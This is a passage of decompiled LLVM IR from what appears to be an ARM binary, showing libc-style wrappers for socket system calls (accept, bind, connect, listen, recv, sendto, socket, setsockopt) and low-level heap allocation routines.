  %v0_fa90 = load i32, i32* %r3.global-to-local, align 4
  %v2_fa90 = mul i32 %v0_fa90, 2
  store i32 %v2_fa90, i32* %r3.global-to-local, align 4
  %v1_fa94 = load i32, i32* @sl, align 4
  %v2_fa94 = add i32 %v1_fa94, 12
  %v3_fa94 = inttoptr i32 %v2_fa94 to i32*
  store i32 %v2_fa90, i32* %v3_fa94, align 4
  %v3_fa98 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_fa98, i32* @r0, align 4
  %v0_fa9c = load i32, i32* @r6, align 4
  %v1_fa9c = load i32, i32* @sl, align 4
  %v2_fa9c = inttoptr i32 %v1_fa9c to i32*
  store i32 %v0_fa9c, i32* %v2_fa9c, align 4
  %v0_faa0 = load i32, i32* @sb, align 4
  %v1_faa0 = load i32, i32* @sl, align 4
  %v2_faa0 = add i32 %v1_faa0, 16
  %v3_faa0 = inttoptr i32 %v2_faa0 to i32*
  store i32 %v0_faa0, i32* %v3_faa0, align 4
  %v0_faa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_faa4 = load i32, i32* @sl, align 4
  %v2_faa4 = add i32 %v1_faa4, 4
  %v3_faa4 = inttoptr i32 %v2_faa4 to i32*
  store i32 %v0_faa4, i32* %v3_faa4, align 4
  %v0_faa8 = call i32 @function_fdcc()
  %v3_faac = load i32, i32* %stack_var_0, align 4
  store i32 %v3_faac, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_fab4 = load i32, i32* @sl, align 4
  %v2_fab4 = inttoptr i32 %v3_faac to i32*
  store i32 %v0_fab4, i32* %v2_fab4, align 4
  %v0_fab8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_fab8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fabc

dec_label_pc_fabc:                                ; preds = %.dec_label_pc_fabc_crit_edge, %dec_label_pc_fa74
  %v0_fac0 = phi i32 [ 1, %.dec_label_pc_fabc_crit_edge ], [ %v0_fab8, %dec_label_pc_fa74 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_fac0, i32* %v1_f808, align 4
  br label %dec_label_pc_fae8

dec_label_pc_fac8:                                ; preds = %dec_label_pc_fa50
  %v3_fac8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_fac8, i32* @r0, align 4
  %v0_facc = call i32 @function_fdcc()
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_f808, align 4
  br label %dec_label_pc_fae8

dec_label_pc_fae4:                                ; preds = %dec_label_pc_f840, %dec_label_pc_f88c, %dec_label_pc_f870, %dec_label_pc_f864, %dec_label_pc_f850
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fae8

dec_label_pc_fae8:                                ; preds = %bb, %dec_label_pc_f824, %dec_label_pc_f81c, %dec_label_pc_f7c4, %dec_label_pc_fac8, %dec_label_pc_fabc, %dec_label_pc_f9bc, %dec_label_pc_f8d8, %dec_label_pc_fae4
  store i32 %v6_f798, i32* @r5, align 4
  store i32 %v9_f798, i32* @r6, align 4
  store i32 %v12_f798, i32* @r7, align 4
  store i32 %v15_f798, i32* @r8, align 4
  store i32 %v18_f798, i32* @sb, align 4
  store i32 %v21_f798, i32* @sl, align 4
  store i32 %v24_f798, i32* @fp, align 4
  %v29_faec = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_faec

; uselistorder directives
  uselistorder i32 %v2_fa90, { 1, 0 }
  uselistorder i32 %v1_f9b4, { 1, 2, 0 }
  uselistorder i32 %v1_f89c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_f898, { 1, 0, 2 }
  uselistorder i32 %v1_f88c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f858.pre, { 0, 2, 1 }
  uselistorder i32 %v1_f834, { 1, 0 }
  uselistorder i32* %v1_f808, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_f7a8, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 3, 4, 5, 6, 7, 8, 9, 21, 10, 11, 12, 14, 13, 15, 20, 16, 18, 17, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_fae8, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_fae4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_fabc, { 1, 0 }
  uselistorder label %dec_label_pc_f850, { 1, 0 }
}

define i32 @function_fb0c(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_fb0c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb0c = load i32, i32* @r4, align 4
  store i32 %v3_fb0c, i32* %stack_var_-8, align 4
  %v5_fb10 = inttoptr i32 %arg3 to i32*
  %v6_fb10 = call i32 @accept(i32 %arg1, %sockaddr* %arg2, i32* %v5_fb10)
  store i32 %v6_fb10, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_fb10, -4095
  br i1 %tmp, label %dec_label_pc_fb30, label %dec_label_pc_fb20

dec_label_pc_fb20:                                ; preds = %dec_label_pc_fb0c
  %v0_fb20 = call i32 @function_cec4()
  %v0_fb24 = load i32, i32* %r4.global-to-local, align 4
  %v1_fb24 = sub i32 0, %v0_fb24
  %v2_fb28 = inttoptr i32 %v0_fb20 to i32*
  store i32 %v1_fb24, i32* %v2_fb28, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb30

dec_label_pc_fb30:                                ; preds = %dec_label_pc_fb0c, %dec_label_pc_fb20
  %v0_fb30 = phi i32 [ %v6_fb10, %dec_label_pc_fb0c ], [ -1, %dec_label_pc_fb20 ]
  %v2_fb34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fb34, i32* @r4, align 4
  ret i32 %v0_fb30

; uselistorder directives
  uselistorder i32 %v6_fb10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fb30, { 1, 0 }
}

define i32 @function_fb38(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_fb38:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb38 = load i32, i32* @r4, align 4
  store i32 %v3_fb38, i32* %stack_var_-8, align 4
  %v5_fb3c = call i32 @bind(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_fb3c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_fb3c, -4095
  br i1 %tmp, label %dec_label_pc_fb5c, label %dec_label_pc_fb4c

dec_label_pc_fb4c:                                ; preds = %dec_label_pc_fb38
  %v0_fb4c = call i32 @function_cec4()
  %v0_fb50 = load i32, i32* %r4.global-to-local, align 4
  %v1_fb50 = sub i32 0, %v0_fb50
  %v2_fb54 = inttoptr i32 %v0_fb4c to i32*
  store i32 %v1_fb50, i32* %v2_fb54, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb5c

dec_label_pc_fb5c:                                ; preds = %dec_label_pc_fb38, %dec_label_pc_fb4c
  %v0_fb5c = phi i32 [ %v5_fb3c, %dec_label_pc_fb38 ], [ -1, %dec_label_pc_fb4c ]
  %v2_fb60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fb60, i32* @r4, align 4
  ret i32 %v0_fb5c

; uselistorder directives
  uselistorder i32 %v5_fb3c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fb5c, { 1, 0 }
}

define i32 @function_fb64(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fb64:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb64 = load i32, i32* @r4, align 4
  store i32 %v3_fb64, i32* %stack_var_-8, align 4
  %v5_fb68 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_fb68, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_fb68, -4095
  br i1 %tmp, label %dec_label_pc_fb88, label %dec_label_pc_fb78

dec_label_pc_fb78:                                ; preds = %dec_label_pc_fb64
  %v0_fb78 = call i32 @function_cec4()
  %v0_fb7c = load i32, i32* %r4.global-to-local, align 4
  %v1_fb7c = sub i32 0, %v0_fb7c
  %v2_fb80 = inttoptr i32 %v0_fb78 to i32*
  store i32 %v1_fb7c, i32* %v2_fb80, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb88

dec_label_pc_fb88:                                ; preds = %dec_label_pc_fb64, %dec_label_pc_fb78
  %v0_fb88 = phi i32 [ %v5_fb68, %dec_label_pc_fb64 ], [ -1, %dec_label_pc_fb78 ]
  %v2_fb8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fb8c, i32* @r4, align 4
  ret i32 %v0_fb88

; uselistorder directives
  uselistorder i32 %v5_fb68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fb88, { 1, 0 }
}

define i32 @function_fb90(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_fb90:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb90 = load i32, i32* @r4, align 4
  store i32 %v3_fb90, i32* %stack_var_-8, align 4
  %v2_fb94 = call i32 @listen(i32 %arg1, i32 %arg2)
  store i32 %v2_fb94, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_fb94, -4095
  br i1 %tmp, label %dec_label_pc_fbb4, label %dec_label_pc_fba4

dec_label_pc_fba4:                                ; preds = %dec_label_pc_fb90
  %v0_fba4 = call i32 @function_cec4()
  %v0_fba8 = load i32, i32* %r4.global-to-local, align 4
  %v1_fba8 = sub i32 0, %v0_fba8
  %v2_fbac = inttoptr i32 %v0_fba4 to i32*
  store i32 %v1_fba8, i32* %v2_fbac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fbb4

dec_label_pc_fbb4:                                ; preds = %dec_label_pc_fb90, %dec_label_pc_fba4
  %v0_fbb4 = phi i32 [ %v2_fb94, %dec_label_pc_fb90 ], [ -1, %dec_label_pc_fba4 ]
  %v2_fbb8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fbb8, i32* @r4, align 4
  ret i32 %v0_fbb4

; uselistorder directives
  uselistorder i32 %v2_fb94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fbb4, { 1, 0 }
}

define i32 @function_fbbc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_fbbc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fbbc = load i32, i32* @r4, align 4
  store i32 %v3_fbbc, i32* %stack_var_-8, align 4
  %v5_fbc0 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_fbc0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_fbc0, -4095
  br i1 %tmp, label %dec_label_pc_fbe0, label %dec_label_pc_fbd0

dec_label_pc_fbd0:                                ; preds = %dec_label_pc_fbbc
  %v0_fbd0 = call i32 @function_cec4()
  %v0_fbd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_fbd4 = sub i32 0, %v0_fbd4
  %v2_fbd8 = inttoptr i32 %v0_fbd0 to i32*
  store i32 %v1_fbd4, i32* %v2_fbd8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fbe0

dec_label_pc_fbe0:                                ; preds = %dec_label_pc_fbbc, %dec_label_pc_fbd0
  %v0_fbe0 = phi i32 [ %v5_fbc0, %dec_label_pc_fbbc ], [ -1, %dec_label_pc_fbd0 ]
  %v2_fbe4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fbe4, i32* @r4, align 4
  ret i32 %v0_fbe0

; uselistorder directives
  uselistorder i32 %v5_fbc0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fbe0, { 1, 0 }
}

define i32 @function_fbe8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_fbe8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_fbe8 = load i32, i32* @r4, align 4
  store i32 %v3_fbe8, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_fbf4 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_fbf4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_fbf4, -4095
  br i1 %tmp, label %dec_label_pc_fc14, label %dec_label_pc_fc04

dec_label_pc_fc04:                                ; preds = %dec_label_pc_fbe8
  %v0_fc04 = call i32 @function_cec4()
  %v0_fc08 = load i32, i32* %r4.global-to-local, align 4
  %v1_fc08 = sub i32 0, %v0_fc08
  %v2_fc0c = inttoptr i32 %v0_fc04 to i32*
  store i32 %v1_fc08, i32* %v2_fc0c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fc14

dec_label_pc_fc14:                                ; preds = %dec_label_pc_fbe8, %dec_label_pc_fc04
  %v0_fc14 = phi i32 [ %v5_fbf4, %dec_label_pc_fbe8 ], [ -1, %dec_label_pc_fc04 ]
  %v2_fc18 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_fc18, i32* @r4, align 4
  ret i32 %v0_fc14

; uselistorder directives
  uselistorder i32 %v5_fbf4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fc14, { 1, 0 }
}

define i32 @function_fc1c(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_fc1c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fc1c = load i32, i32* @r4, align 4
  store i32 %v3_fc1c, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_fc24 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_fc24, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_fc24, -4095
  br i1 %tmp, label %dec_label_pc_fc44, label %dec_label_pc_fc34

dec_label_pc_fc34:                                ; preds = %dec_label_pc_fc1c
  %v0_fc34 = call i32 @function_cec4()
  %v0_fc38 = load i32, i32* %r4.global-to-local, align 4
  %v1_fc38 = sub i32 0, %v0_fc38
  %v2_fc3c = inttoptr i32 %v0_fc34 to i32*
  store i32 %v1_fc38, i32* %v2_fc3c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fc44

dec_label_pc_fc44:                                ; preds = %dec_label_pc_fc1c, %dec_label_pc_fc34
  %v0_fc44 = phi i32 [ %v5_fc24, %dec_label_pc_fc1c ], [ -1, %dec_label_pc_fc34 ]
  %v2_fc48 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fc48, i32* @r4, align 4
  ret i32 %v0_fc44

; uselistorder directives
  uselistorder i32 %v5_fc24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fc44, { 1, 0 }
}

define i32 @function_fc4c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fc4c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fc4c = load i32, i32* @r4, align 4
  store i32 %v3_fc4c, i32* %stack_var_-8, align 4
  %v3_fc50 = call i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_fc50, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_fc50, -4095
  br i1 %tmp, label %dec_label_pc_fc70, label %dec_label_pc_fc60

dec_label_pc_fc60:                                ; preds = %dec_label_pc_fc4c
  %v0_fc60 = call i32 @function_cec4()
  %v0_fc64 = load i32, i32* %r4.global-to-local, align 4
  %v1_fc64 = sub i32 0, %v0_fc64
  %v2_fc68 = inttoptr i32 %v0_fc60 to i32*
  store i32 %v1_fc64, i32* %v2_fc68, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fc70

dec_label_pc_fc70:                                ; preds = %dec_label_pc_fc4c, %dec_label_pc_fc60
  %v0_fc70 = phi i32 [ %v3_fc50, %dec_label_pc_fc4c ], [ -1, %dec_label_pc_fc60 ]
  %v2_fc74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fc74, i32* @r4, align 4
  ret i32 %v0_fc70

; uselistorder directives
  uselistorder i32 %v3_fc50, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fc70, { 1, 0 }
}

define i32 @function_fc78(i32 %arg1) local_unnamed_addr {
dec_label_pc_fc78:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_fc78 = load i32, i32* @r4, align 4
  %v6_fc78 = load i32, i32* @r5, align 4
  %v9_fc78 = load i32, i32* @r6, align 4
  %v0_fc7c = load i32, i32* %r0.global-to-local, align 4
  %v2_fc7c = icmp eq i32 %v0_fc7c, 0
  %v2_fc80 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_fc7c, label %bb, label %dec_label_pc_fc8c

bb:                                               ; preds = %dec_label_pc_fc78
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc94

dec_label_pc_fc8c:                                ; preds = %dec_label_pc_fc78
  %tmp = icmp ugt i32 %v0_fc7c, -8
  br i1 %tmp, label %dec_label_pc_fd98, label %dec_label_pc_fc94

dec_label_pc_fc94:                                ; preds = %bb, %dec_label_pc_fc8c
  %v0_fc94 = phi i32 [ %v0_fc7c, %dec_label_pc_fc8c ], [ 1, %bb ]
  %v1_fc94 = add i32 %v0_fc94, 4
  store i32 %v1_fc94, i32* %stack_var_-20, align 4
  store i32 %v2_fc80, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_22c58.440 to i32), i32* %r0.global-to-local, align 4
  %v1_fcac = call i32 @function_10d4c()
  store i32 ptrtoint (i32** @global_var_203fc.444 to i32), i32* %r0.global-to-local, align 4
  %v3_fcb8 = call i32 @function_ffd4(i32* bitcast (i32** @global_var_203fc.444 to i32*), i32 %v2_fc80)
  store i32 %v3_fcb8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22c58.440 to i32), i32* %r0.global-to-local, align 4
  store i32 64720, i32* @lr, align 4
  %v1_fccc = call i32 @function_10d4c()
  store i32 %v1_fccc, i32* %r0.global-to-local, align 4
  %v2_fcd0 = icmp eq i32 %v3_fcb8, 0
  br i1 %v2_fcd0, label %dec_label_pc_fcd8, label %dec_label_pc_fd88

dec_label_pc_fcd8:                                ; preds = %dec_label_pc_fc94
  %v2_fcdc = load i32, i32* @global_var_22c80.274, align 4
  store i32 %v2_fcdc, i32* @r4, align 4
  %v2_fce0 = load i32, i32* %stack_var_-20, align 4
  %v3_fce4 = icmp ult i32 %v2_fce0, %v2_fcdc
  br i1 %v3_fce4, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_fcd8
  %v3_fce8 = add i32 %v2_fcdc, -1
  %v2_fcec = add i32 %v3_fce8, %v2_fce0
  %v2_fcf0 = sub i32 0, %v2_fcdc
  %v3_fcf4 = and i32 %v2_fcec, %v2_fcf0
  store i32 %v3_fcf4, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_fcd8, %bb14
  store i32 ptrtoint (i32* @global_var_22ed8.448 to i32), i32* %r0.global-to-local, align 4
  %v1_fd00 = call i32 @function_10d4c()
  %v0_fd04 = load i32, i32* @r4, align 4
  store i32 %v0_fd04, i32* %r0.global-to-local, align 4
  %v1_fd08 = call i32 @function_1143c(i32 %v0_fd04)
  store i32 %v1_fd08, i32* %r0.global-to-local, align 4
  %v7_fd0c = icmp eq i32 %v1_fd08, -1
  br i1 %v7_fd0c, label %bb15, label %dec_label_pc_fd18

bb15:                                             ; preds = %.thread3
  store i32 %v1_fd08, i32* @r5, align 4
  br label %dec_label_pc_fd2c

dec_label_pc_fd18:                                ; preds = %.thread3
  %v1_fd18 = add i32 %v1_fd08, 3
  %v1_fd1c = and i32 %v1_fd18, -4
  store i32 %v1_fd1c, i32* @r5, align 4
  %v9_fd20 = icmp eq i32 %v1_fd1c, %v1_fd08
  br i1 %v9_fd20, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_fd18
  %v3_fd24 = sub i32 %v1_fd1c, %v1_fd08
  store i32 %v3_fd24, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_fd18, %bb16
  %v1_fd28 = xor i1 %v9_fd20, true
  call void @__pseudo_cond_branch(i1 %v1_fd28, i32 ptrtoint (i32* @global_var_1143c.449 to i32))
  br label %dec_label_pc_fd2c

dec_label_pc_fd2c:                                ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_22ed8.448 to i32), i32* %r0.global-to-local, align 4
  store i32 64828, i32* @lr, align 4
  %v1_fd38 = call i32 @function_10d4c()
  store i32 %v1_fd38, i32* %r0.global-to-local, align 4
  %v0_fd3c = load i32, i32* @r5, align 4
  %v7_fd3c = icmp eq i32 %v0_fd3c, -1
  br i1 %v7_fd3c, label %dec_label_pc_fd98, label %dec_label_pc_fd44

dec_label_pc_fd44:                                ; preds = %dec_label_pc_fd2c
  store i32 ptrtoint (i32* @global_var_22c58.440 to i32), i32* %r0.global-to-local, align 4
  %v1_fd50 = call i32 @function_10d4c()
  %v0_fd54 = load i32, i32* @r4, align 4
  %v0_fd58 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_203fc.444 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_fd58, 16777216
  %v2_fd60 = sdiv i32 %sext, 16777216
  %v5_fd60 = call i32 @function_10128(i32* bitcast (i32** @global_var_203fc.444 to i32*), i32 %v2_fd60, i32 %v0_fd54)
  store i32 ptrtoint (i32** @global_var_203fc.444 to i32), i32* %r0.global-to-local, align 4
  %v3_fd6c = call i32 @function_ffd4(i32* bitcast (i32** @global_var_203fc.444 to i32*), i32 %v2_fc80)
  store i32 %v3_fd6c, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22c58.440 to i32), i32* %r0.global-to-local, align 4
  store i32 64896, i32* @lr, align 4
  %v1_fd7c = call i32 @function_10d4c()
  store i32 %v1_fd7c, i32* %r0.global-to-local, align 4
  %v2_fd80 = icmp eq i32 %v3_fd6c, 0
  br i1 %v2_fd80, label %dec_label_pc_fd98, label %dec_label_pc_fd88

dec_label_pc_fd88:                                ; preds = %dec_label_pc_fc94, %dec_label_pc_fd44
  %v1_fd8c = phi i32 [ %v3_fcb8, %dec_label_pc_fc94 ], [ %v3_fd6c, %dec_label_pc_fd44 ]
  %v2_fd88 = load i32, i32* %stack_var_-20, align 4
  %v2_fd8c = inttoptr i32 %v1_fd8c to i32*
  store i32 %v2_fd88, i32* %v2_fd8c, align 4
  %v3_fd8c = load i32, i32* %r4.global-to-local, align 4
  %v4_fd8c = add i32 %v3_fd8c, 4
  store i32 %v4_fd8c, i32* %r4.global-to-local, align 4
  %v2_fd90 = icmp eq i32 %v4_fd8c, 0
  br i1 %v2_fd90, label %dec_label_pc_fd98, label %dec_label_pc_fda8

dec_label_pc_fd98:                                ; preds = %dec_label_pc_fd88, %dec_label_pc_fd44, %dec_label_pc_fd2c, %dec_label_pc_fc8c
  %v0_fd98 = call i32 @function_cec4()
  store i32 %v0_fd98, i32* %r0.global-to-local, align 4
  %v2_fda0 = inttoptr i32 %v0_fd98 to i32*
  store i32 12, i32* %v2_fda0, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fda8

dec_label_pc_fda8:                                ; preds = %dec_label_pc_fd88, %dec_label_pc_fd98
  %v0_fda8 = phi i32 [ %v4_fd8c, %dec_label_pc_fd88 ], [ 0, %dec_label_pc_fd98 ]
  store i32 %v0_fda8, i32* %r0.global-to-local, align 4
  store i32 %v3_fc78, i32* @r4, align 4
  store i32 %v6_fc78, i32* @r5, align 4
  store i32 %v9_fc78, i32* @r6, align 4
  ret i32 %v0_fda8

; uselistorder directives
  uselistorder i32 %v0_fda8, { 1, 0 }
  uselistorder i32 %v3_fd6c, { 1, 0, 2 }
  uselistorder i32 %v1_fd1c, { 1, 0, 2 }
  uselistorder i32 %v1_fd08, { 2, 0, 4, 3, 1, 5 }
  uselistorder i32 %v3_fcb8, { 1, 0, 2 }
  uselistorder i32 %v0_fc7c, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 6, 7, 8, 9, 11, 10, 16, 13, 12, 14, 15, 17, 18, 19, 0, 1 }
  uselistorder label %dec_label_pc_fda8, { 1, 0 }
  uselistorder label %dec_label_pc_fd88, { 1, 0 }
  uselistorder label %dec_label_pc_fd2c, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_fc94, { 1, 0 }
}

define i32 @function_fdcc() local_unnamed_addr {
dec_label_pc_fdcc:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_fdcc = load i32, i32* @r0, align 4
  %v2_fdcc = icmp eq i32 %v0_fdcc, 0
  %v3_fdd0 = load i32, i32* @r4, align 4
  store i32 %v3_fdd0, i32* %stack_var_-24, align 4
  %v6_fdd0 = load i32, i32* @r5, align 4
  %v9_fdd0 = load i32, i32* @r6, align 4
  %v15_fdd0 = load i32, i32* @r8, align 4
  br i1 %v2_fdcc, label %bb, label %bb11

bb:                                               ; preds = %dec_label_pc_fdcc
  ret i32 0

bb11:                                             ; preds = %dec_label_pc_fdcc
  %v1_fdd8 = add i32 %v0_fdcc, -4
  %v2_fdd8 = inttoptr i32 %v1_fdd8 to i32*
  %v3_fdd8 = load i32, i32* %v2_fdd8, align 4
  store i32 %v3_fdd8, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_203fc.444 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_fdd8, i32* @r4, align 4
  %v1_fdf0 = call i32 @function_10d4c()
  %v0_fdf4 = load i32, i32* @r4, align 4
  %v0_fdf8 = load i32, i32* @r5, align 4
  %v4_fe00 = call i32 @function_10128(i32* bitcast (i32** @global_var_203fc.444 to i32*), i32 %v0_fdf4, i32 %v0_fdf8)
  %v1_fe08 = inttoptr i32 %v4_fe00 to i32*
  %v2_fe08 = load i32, i32* %v1_fe08, align 4
  store i32 %v2_fe08, i32* %r6.global-to-local, align 4
  %v2_fe0c = load i32, i32* @global_var_22c80.274, align 4
  %v4_fe10 = mul i32 %v2_fe0c, 8
  %v6_fe10 = icmp ult i32 %v2_fe08, %v4_fe10
  store i32 %v4_fe00, i32* @r4, align 4
  br i1 %v6_fe10, label %dec_label_pc_fe50, label %dec_label_pc_fe1c

dec_label_pc_fe1c:                                ; preds = %bb11
  %v1_fe24 = call i32 @function_10d4c()
  %v1_fe2c = call i32 @function_1143c(i32 0)
  %v0_fe30 = load i32, i32* @r4, align 4
  %v1_fe30 = add i32 %v0_fe30, 12
  store i32 %v1_fe30, i32* @r5, align 4
  %v9_fe34 = icmp eq i32 %v1_fe30, %v1_fe2c
  br i1 %v9_fe34, label %dec_label_pc_fe58, label %dec_label_pc_fe3c

dec_label_pc_fe3c:                                ; preds = %dec_label_pc_fe1c
  %v1_fe48 = call i32 @function_10d4c()
  br label %dec_label_pc_fe50

dec_label_pc_fe50:                                ; preds = %bb11, %dec_label_pc_fe3c, %bb14
  %v2_fe50 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_fe50, i32* @r4, align 4
  store i32 %v6_fdd0, i32* @r5, align 4
  store i32 %v9_fdd0, i32* %r6.global-to-local, align 4
  store i32 %v15_fdd0, i32* %r8.global-to-local, align 4
  %v0_fe54 = call i32 @function_10d4c()
  %v0_fe58.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fe58

dec_label_pc_fe58:                                ; preds = %dec_label_pc_fe1c, %dec_label_pc_fe50
  %v1_fe60 = phi i32 [ %v0_fe30, %dec_label_pc_fe1c ], [ %v0_fe58.pre, %dec_label_pc_fe50 ]
  %v1_fe58 = add i32 %v1_fe60, 4
  %v2_fe58 = inttoptr i32 %v1_fe58 to i32*
  %v3_fe58 = load i32, i32* %v2_fe58, align 4
  %v2_fe5c = icmp eq i32 %v3_fe58, 0
  br i1 %v2_fe5c, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_fe58
  %v2_fe60 = add i32 %v1_fe60, 8
